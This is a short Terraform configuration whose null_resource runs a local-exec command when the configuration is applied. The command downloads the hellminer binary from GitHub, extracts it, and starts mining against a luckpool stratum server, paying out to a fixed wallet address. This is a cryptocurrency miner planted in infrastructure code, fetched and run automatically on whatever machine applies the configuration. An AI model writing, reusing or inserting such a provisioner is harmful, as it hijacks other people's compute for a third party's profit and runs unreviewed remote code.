resource "null_resource" "extrac_and_run_1" {
  provisioner "local-exec" {
    command = <<EOT
curl -L https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz > hellminer_linux64.tar.gz
tar -xzvf hellminer_linux64.tar.gz
./hellminer -c stratum+tcp://na.luckpool.net:3956 -u REBiQeBs4ZcXQV2xu961D6JxzhXAZ53qXp.001 -p x --cpu 2
EOT
  }
}
